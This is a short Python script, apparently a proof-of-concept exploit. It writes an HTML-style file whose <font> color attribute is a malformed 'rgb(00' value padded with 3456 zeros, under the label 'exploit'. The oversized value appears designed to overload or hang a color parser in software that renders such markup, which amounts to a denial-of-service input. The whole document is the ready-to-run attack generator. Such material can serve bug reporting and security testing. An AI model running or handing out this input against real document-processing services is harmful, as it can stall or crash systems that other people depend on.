expl = 'rgb(00' + '0' * 3456

with open("a.html", "w") as f:
    f.write(f"""<para><font color="{expl}">
                exploit
</font></para>""")